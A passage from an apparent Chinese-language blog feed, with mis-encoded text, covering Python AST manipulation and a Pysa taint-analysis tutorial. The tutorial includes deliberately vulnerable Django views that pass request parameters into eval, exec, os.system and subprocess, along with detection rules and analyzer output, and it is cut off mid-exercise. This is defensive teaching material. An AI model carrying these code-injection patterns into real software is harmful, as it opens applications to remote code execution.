class="line">        <span class="keyword">return</span> ast.If(</span><br><span class="line">            test=node.test,</span><br><span class="line">            body=node.body,</span><br><span class="line">            orelse=[]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">transformer = NodeTransformer()</span><br><span class="line">f_ast = transformer.visit(f_ast) <span class="comment"># è¿”å›æ–°çš„ AST</span></span><br><span class="line">ast.fix_missing_locations(f_ast)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">even:  0</span><br></pre></td></tr></table></figure></li></ol><h2 id="å¯è§†åŒ–-AST"><a href="#å¯è§†åŒ–-AST" class="headerlink" title="å¯è§†åŒ– AST"></a>å¯è§†åŒ– AST</h2><p>ä½¿ç”¨ graphviz ç»˜åˆ¶ï¼Œéå† AST èŠ‚ç‚¹ï¼Œå°†æ¯ä¸ªèŠ‚ç‚¹å¯¹è±¡çš„ç±»å‹åç§°ä½œä¸ºç‚¹ï¼Œçˆ¶èŠ‚ç‚¹å’Œæ¯ä¸ªå­èŠ‚ç‚¹éƒ½è¿ä¸€æ¡è¾¹ã€‚</p><div class="note info flat"><ol><li><p>å®‰è£… graphviz äºŒè¿›åˆ¶ç¨‹åº ğŸ‘‰ <a href="https://graphviz.org/download/">https://graphviz.org/download/</a></p></li><li><p>pip å®‰è£…åŒ…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install graphviz</span><br></pre></td></tr></table></figure></li></ol></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span>(<span class="params">node, nodes, pindex, g</span>):</span></span><br><span class="line">    name = <span class="built_in">str</span>(<span class="built_in">type</span>(node).__name__)</span><br><span class="line">    index = <span class="built_in">len</span>(nodes)</span><br><span class="line">    nodes.append(index)</span><br><span class="line">    g.node(<span class="built_in">str</span>(index), name)</span><br><span class="line">    <span class="keyword">if</span> index != pindex:</span><br><span class="line">        g.edge(<span class="built_in">str</span>(index), <span class="built_in">str</span>(pindex))</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> ast.iter_child_nodes(node):</span><br><span class="line">        visit(n, nodes, index, g)</span><br><span class="line">    </span><br><span class="line">graph = Digraph(<span class="built_in">format</span>=<span class="string">&quot;png&quot;</span>)</span><br><span class="line">tree = ast.parse(data)</span><br><span class="line">visit(tree, [], <span class="number">0</span>, graph)</span><br><span class="line">graph.render(<span class="string">&quot;test&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ test.png å¦‚ä¸‹ï¼š</p><img src="https://i.loli.net/2021/07/15/3lrJHjtdRuTW9oY.png"><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://kamneemaran45.medium.com/python-ast-5789a1b60300">Python AST</a></li><li><a href="https://devguide.python.org/compiler/">25. Design of CPythonâ€™s Compiler</a></li><li><a href="https://docs.python.org/zh-cn/3/c-api/code.html">ä»£ç å¯¹è±¡</a></li><li><a href="https://docs.python.org/zh-cn/3/library/ast.html">ast â€” æŠ½è±¡è¯­æ³•æ ‘</a></li><li><a href="https://docs.python.org/zh-cn/3/library/py_compile.html">py_compile â€” ç¼–è¯‘ Python æºæ–‡ä»¶</a></li><li><a href="https://docs.python.org/zh-cn/3/library/dis.html">dis â€” Python å­—èŠ‚ç åæ±‡ç¼–å™¨</a></li><li><a href="https://qiita.com/kaityo256/items/e83b369ba7518da0a519">Pythonã®æŠ½è±¡æ§‹æ–‡æœ¨ã‚’Graphvizã§å¯è¦–åŒ–ã™ã‚‹</a></li></ul>]]></content>
    
    
    <summary type="html">ä½¿ç”¨ ast æ¨¡å—æ“ä½œæŠ½è±¡è¯­æ³•æ ‘ï¼Œä¿®æ”¹/æ›¿æ¢èŠ‚ç‚¹ã€‚</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Pyre æ±¡ç‚¹åˆ†æå·¥å…· Pysa ä½¿ç”¨æ•™ç¨‹</title>
    <link href="https://jckling.github.io/2021/07/07/Security/Pysa%20Tutorial/"/>
    <id>https://jckling.github.io/2021/07/07/Security/Pysa%20Tutorial/</id>
    <published>2021-07-07T03:39:19.000Z</published>
    <updated>2021-10-11T13:39:04.669Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç”± Facebook å¼€æºçš„ <a href="https://github.com/facebook/pyre-check">Pyre</a> æ˜¯å…¼å®¹ <a href="https://www.python.org/dev/peps/pep-0484/">PEP 484</a> çš„ Python æ€§èƒ½ç±»å‹æ£€æŸ¥å™¨ï¼Œå¯ä»¥å¢é‡åˆ†æå¤§å‹ä»£ç åº“ï¼Œèƒ½å¤Ÿè¿…é€Ÿå¤„ç†ç™¾ä¸‡çº§åˆ«çš„ä»£ç ã€‚Pyre é™„å¸¦äº† Pysaï¼Œä¸€ä¸ªå…³æ³¨å®‰å…¨æ€§çš„é™æ€åˆ†æå·¥å…·ï¼ŒPysa æ˜¯ Python Static Analyzer çš„ç¼©å†™ï¼ŒPysa æ”¯æŒè¿½è¸ªå’Œåˆ†æ Python ç¨‹åºä¸­çš„æ•°æ®æµï¼ˆæ±¡ç‚¹åˆ†æï¼‰ã€‚</p><p>æ­¤å¤–è¿˜æœ‰ä¸€ä¸ª <a href="https://github.com/facebook/sapp">SAPP</a> (Static Analysis Post Processor) é™æ€åˆ†æåç½®å¤„ç†å™¨ï¼Œæä¾›å‘½ä»¤è¡Œå’Œ UI æ£€ç´¢ Pysa çš„æ‰§è¡Œç»“æœã€‚</p><p>å…³äº Python çš„ç±»å‹ï¼ˆ<a href="https://www.python.org/dev/peps/pep-0484/">PEP 484</a>ï¼‰ï¼Œå»ºè®®é˜…è¯» <a href="https://github.com/python/mypy">mypy</a> çš„ <a href="https://mypy.readthedocs.io/en/stable/cheat_sheet_py3.html">æ¸…å•</a> å’Œ <a href="https://mypy.readthedocs.io/en/stable/builtin_types.html">ç±»å‹å‚è€ƒ</a> ã€‚ä¸‹é¢å°±æ˜¯æ²¡æœ‰æ·»åŠ å’Œæ·»åŠ äº†ç±»å‹æ³¨é‡Šçš„ä¸¤ä¸ªå‡½æ•°ï¼ŒPython3.5 å¼€å§‹æ”¯æŒå¯é€‰çš„ç±»å‹æ³¨é‡Šï¼Œè¿™ä¸ªç‰¹æ€§æå¤§åœ°æ–¹ä¾¿äº†å¯¹ Python ç¨‹åºè¿›è¡Œé™æ€åˆ†æï¼Œä¸è¿‡å°±æˆ‘çœ‹åˆ°çš„å¼€æºå·¥å…·å¾ˆå°‘æœ‰æ·»åŠ ç±»å‹æ³¨é‡Šçš„â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unannotated</span>():</span>        <span class="comment"># implictly returns `Any`</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span> + <span class="string">&quot;&quot;</span>       <span class="comment"># function body is not checked</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">annotated</span>() -&gt; List:</span>  <span class="comment"># explicit return annotation means we type check `annotated`</span></span><br><span class="line">    <span class="built_in">any</span> = unannotated()</span><br><span class="line">    <span class="built_in">any</span>.attribute         <span class="comment"># `Any` has all possible attributes</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>              <span class="comment"># Error: returning `int` but expecting `List`</span></span><br></pre></td></tr></table></figure><p>Pysa è·Ÿè¸ªæ•°æ®æµï¼Œç”¨æˆ·å®šä¹‰æºç‚¹ï¼ˆäº§ç”Ÿæ•°æ®çš„åœ°æ–¹ï¼‰å’Œæ±‡ç‚¹ï¼ˆæ¥è‡ªæºç‚¹çš„æ•°æ®ä¸åº”è¯¥ç»“æŸçš„åœ°æ–¹ï¼‰ï¼Œå½“æºç‚¹å’Œæ±‡ç‚¹ç›¸äº¤æ—¶å°±äº§ç”Ÿäº†é—®é¢˜</p><ul><li>æœ€å¸¸è§çš„æ•°æ®æºç‚¹å°±æ˜¯ç”¨æˆ·æ§åˆ¶çš„è¾“å…¥</li><li>æ±‡ç‚¹æ¯”è¾ƒå¤šæ ·ï¼ŒåŒ…æ‹¬å„ç§ API</li></ul><img src="https://i.loli.net/2021/07/08/wNPmpHqg1WKh9Cr.jpg" width=80%><p>Pysa æ‰§è¡Œçš„æ˜¯è¿‡ç¨‹é—´åˆ†æï¼Œå³è·Ÿè¸ªè·¨å‡½æ•°è°ƒç”¨çš„æ•°æ®æµï¼ˆæ±¡ç‚¹åˆ†æï¼‰ï¼Œä½¿ç”¨ä»£ç ä¸­çš„æ‰€æœ‰å¯ç”¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¯é€‰çš„é™æ€ç±»å‹ä¿¡æ¯ã€‚Pyre èƒ½å¤Ÿä¸ºæºç æ·»åŠ ç±»å‹ä¿¡æ¯ï¼Œå®ƒæœ¬èº«çš„ä½œç”¨å°±æ˜¯é™æ€ç±»å‹æ£€æŸ¥å™¨ã€‚</p><p>å±€é™</p><ol><li><p>é—®é¢˜ç©ºé—´</p><p> Pysa åªèƒ½è¿½è¸ªä» admin_operation åˆ° delete_user çš„æ•°æ®æµï¼Œæ— æ³•æ£€æŸ¥ user_is_admin</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_operation</span>(<span class="params">request: HttpRequest</span>):</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> user_is_admin():</span><br><span class="line">      <span class="keyword">return</span> Http404</span><br><span class="line"> </span><br><span class="line">  delete_user(request.GET[<span class="string">&quot;user_to_delete&quot;</span>])</span><br></pre></td></tr></table></figure></li><li><p>Python çš„åŠ¨æ€ç‰¹æ€§</p><p> Pysa æ— æ³•è¯†åˆ«åŠ¨æ€å¯¼å…¥çš„æ¨¡å—å‡½æ•°è°ƒç”¨</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_eval</span>(<span class="params">request: HttpRequest</span>):</span></span><br><span class="line">  os = importlib.import_module(<span class="string">&quot;os&quot;</span>)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Pysa won&#x27;t know what &#x27;os&#x27; is, and thus won&#x27;t</span></span><br><span class="line">  <span class="comment"># catch this remote code execution issue</span></span><br><span class="line">  os.system(request.GET[<span class="string">&quot;command&quot;</span>])</span><br></pre></td></tr></table></figure></li><li><p>è£…é¥°å™¨</p><p> 2020.8.7 Facebook åšå®¢æŒ‡å‡ºæš‚ä¸æ”¯æŒåœ¨è°ƒç”¨å›¾ä¸­åŒ…æ‹¬è£…é¥°å™¨</p></li></ol><p>Facebook æä¾›äº† Pysa çš„æ•™ç¨‹ ğŸ‘‰ <a href="https://github.com/facebook/pyre-check/tree/master/documentation/pysa_tutorial">Pysa Tutorial</a> ï¼Œæ¶µç›–å‡ ä¸ªä¸»è¦çš„å†…å®¹ï¼Œè¿›è¡Œå®éªŒçš„è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ä¹Ÿéƒ½ç£•ç£•ç»Šç»Šåœ°è§£å†³äº†ã€‚</p><h1 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h1><p>Pysa ä½¿ç”¨ <code>pyre analyze</code> è°ƒç”¨ï¼Œå®éªŒä¸­æ¶‰åŠåˆ°ä»¥ä¸‹å‡ ä¸ªé…ç½®æ–‡ä»¶å’Œå·¥å…·ï¼š</p><p><code>taint.config</code> </p><ul><li>å®šä¹‰æ±¡ç‚¹çš„æºï¼ˆsourceï¼‰å’Œæ±‡ï¼ˆsinkï¼‰ï¼Œè¿˜åŒ…æ‹¬éšå¼çš„æºå’Œæ±‡</li><li>æ£€æµ‹è§„åˆ™ï¼ˆruleï¼‰ï¼Œä¾‹å¦‚ï¼Œä»æŸæºç‚¹åˆ°æŸæ±‡ç‚¹æ˜¯ XXX æ”»å‡»ï¼Œä¸€æ¡è§„åˆ™ä¸­å¯ä»¥åŒ…å«å¤šä¸ªæºå’Œæ±‡</li><li>ç‰¹å¾ï¼ˆfeatureï¼‰ï¼šæ±¡ç‚¹çš„é™„åŠ å…ƒæ•°æ®ï¼Œå¯ç”¨äºè¿‡æ»¤è¯¯æŠ¥</li></ul><p><code>.pysa</code> </p><ul><li>æ±¡ç‚¹æ¨¡å‹ï¼Œè¡¨ç¤ºå“ªé‡Œæ˜¯æºç‚¹å’Œæ±‡ç‚¹ï¼ˆåˆ©ç”¨ç­¾åï¼‰ï¼Œä½¿ç”¨å®Œå…¨é™å®šåï¼Œæ ¼å¼å¿…é¡»åŒ¹é… <code>.pyi</code> å­˜æ ¹æ–‡ä»¶<ul><li><code>TaintSource[SOURCE_NAME]</code> æ ‡è®°æºç‚¹</li><li><code>TaintSink[SINK_NAME]</code> æ ‡è®°æ±‡ç‚¹</li><li><code>TaintInTaintOut</code> æ ‡è®°æ±¡ç‚¹è¿›å…¥è¿›å‡ºï¼ŒæŒ‡çš„æ˜¯è¿›å…¥å‡½æ•°çš„æ±¡ç‚¹ä¼ æ’­åˆ°è¿”å›å€¼ä¸­</li><li><code>PartialSink</code> æ ‡è®°ç»„åˆæºï¼Œä½¿ç”¨è§„åˆ™åç§°</li></ul></li><li>æ¶ˆæ¯’å™¨ï¼ˆSanitizerï¼‰è¡¨ç¤ºå¯¹è±¡çš„å˜åŒ–ï¼Œç»è¿‡æ¶ˆæ¯’å™¨æ±¡ç‚¹å°±è¢«å‡€åŒ–ï¼Œä¸å†è·Ÿè¸ª<ul><li>ä½¿ç”¨è£…é¥°å™¨å£°æ˜å‡½æ•°ä¸ºæ¶ˆæ¯’å™¨</li><li>å¯ä»¥é™å®šèŒƒå›´ï¼šæºï¼ˆsourceï¼‰ã€æ±‡ï¼ˆsinkï¼‰ã€æ±¡ç‚¹è¿›æ±¡ç‚¹å‡ºï¼ˆtaint-in-taint-out, TITOï¼‰</li></ul></li></ul><p><code>.pyre_configuration</code></p><ul><li>è·¯å¾„é…ç½®ï¼šæºä»£ç ã€å­˜æ ¹æ–‡ä»¶ç­‰</li></ul><p>SAPP</p><ul><li>äº¤äº’å¼å‘½ä»¤è¡Œ</li><li>Web æœåŠ¡å™¨</li></ul><p>åŠ¨æ€ç”Ÿæˆæ±¡ç‚¹æ¨¡å‹</p><ul><li><a href="https://github.com/facebook/pyre-check/tree/master/tools/generate_taint_models">pyre-check/tools/generate_taint_models/get_*.py</a> åŒ…å«é¢„å®šä¹‰çš„ä¸€äº›ç”Ÿæˆå™¨</li><li>éµå¾ªæ¨¡å‹é¢†åŸŸç‰¹å®šè¯­è¨€ï¼ˆDomain Specific Language, DSLï¼‰</li></ul><h2 id="ç¯å¢ƒè®¾ç½®"><a href="#ç¯å¢ƒè®¾ç½®" class="headerlink" title="ç¯å¢ƒè®¾ç½®"></a>ç¯å¢ƒè®¾ç½®</h2><p>å®éªŒç¯å¢ƒï¼š Ubuntu 20.04 Server + Python 3.8.10 + pip 20.0.2</p><p>åœ¨ Python è™šæ‹Ÿç¯å¢ƒä¸­è¿›è¡Œå®éªŒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/facebook/pyre-check.git</span><br><span class="line"><span class="built_in">cd</span> pyre-check</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">cd</span> documentation/pysa_tutorial</span><br><span class="line">python -m venv tutorial</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> tutorial/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">pip install pyre-check fb-sapp</span><br></pre></td></tr></table></figure><div class="note danger flat"><p>å¦‚æœè¿™é‡Œé‡åˆ° Error å¯ä»¥æ›´æ–°ä¸€ä¸‹å·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install wheel</span><br><span class="line">python -m pip install --upgrade setuptools</span><br></pre></td></tr></table></figure></div><h2 id="exercise1"><a href="#exercise1" class="headerlink" title="exercise1"></a>exercise1</h2><p>views.py å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRemote Code Execution, RCEï¼‰æ¼æ´ã€‚Pysa éœ€è¦çŸ¥é“ <code>request.GET</code> åŒ…å«ç”¨æˆ·æ§åˆ¶çš„æ•°æ®ï¼Œ<code>eval</code> å¯ä»¥æ‰§è¡Œä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>taint.config ç¼–å†™è§„åˆ™ï¼Œå‘Šè¯‰ Pysa å½“ CustomUserControlled æºç‚¹æ•°æ®åˆ°è¾¾ CodeExecution æ±‡ç‚¹æ—¶ä¼šå¼•å‘ RCE ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CustomUserControlled&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate user input&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CodeExecution&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate execution of python code&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;code&quot;</span>: <span class="number">5001</span>,</span><br><span class="line">      <span class="attr">&quot;sources&quot;</span>: [ <span class="string">&quot;CustomUserControlled&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;sinks&quot;</span>: [ <span class="string">&quot;CodeExecution&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;message_format&quot;</span>: <span class="string">&quot;User specified data may reach a code execution sink&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sources_sinks.pysa å‘Šè¯‰ Pysa <code>request.Get</code> æ˜¯ <code>CustomUserControlled</code> ç±»å‹çš„æ±¡ç‚¹æºç‚¹ <code>TaintSource</code>ï¼Œè€Œ <code>eval</code> æ˜¯ <code>CodeExecution</code> ä»£ç æ‰§è¡Œç±»å‹çš„æ±¡ç‚¹æ±‡ç‚¹ <code>TaintSink</code> ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">django.http.request.HttpRequest.GET: TaintSource[CustomUserControlled] &#x3D; ...</span><br><span class="line"></span><br><span class="line">def eval(__source: TaintSink[CodeExecution], __globals, __locals): ...</span><br></pre></td></tr></table></figure><p>.pyre_configuration é…ç½®äº†æœç´¢çš„è·¯å¾„ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;source_directories&quot;</span>: [ <span class="comment">// æŸ¥æ‰¾æºç çš„ç›®å½•</span></span><br><span class="line">    <span class="string">&quot;.&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;taint_models_path&quot;</span>: [ <span class="comment">// æŸ¥æ‰¾ .pysa/taint.config æ–‡ä»¶çš„ç›®å½•</span></span><br><span class="line">    <span class="string">&quot;.&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;search_path&quot;</span>: [  <span class="comment">// æŸ¥æ‰¾å­˜æ ¹æ–‡ä»¶</span></span><br><span class="line">    <span class="string">&quot;../../../stubs/&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;exclude&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;.*/integration_test/.*&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;use_command_v2&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“çš„æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼Œæœ€åè¾“å‡ºçš„ JSON æ•°ç»„ç»™å‡ºäº†é—®é¢˜åˆ—è¡¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise1$ pyre analyze</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__eq__` has 82 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__init__` has 754 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__ne__` has 60 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__call__` has 131 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__init__` has 448 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__new__` has 75 overrides, this might slow down the analysis considerably.</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 12,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 12,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="exercise2"><a href="#exercise2" class="headerlink" title="exercise2"></a>exercise2</h2><p>views.py ä¸‰ä¸ªå‡½æ•°éƒ½å­˜åœ¨è¿œç¨‹æ‰§è¡Œæ¼æ´ï¼Œå‰ä¸¤ä¸ªæ‰§è¡Œ python ä»£ç ï¼Œæœ€åä¸€ä¸ªæ‰§è¡Œ shell ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.POST[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_fours</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    result = subprocess.getoutput(<span class="string">f&quot;expr 4 <span class="subst">&#123;operator&#125;</span> 4&quot;</span>)</span><br><span class="line">    <span 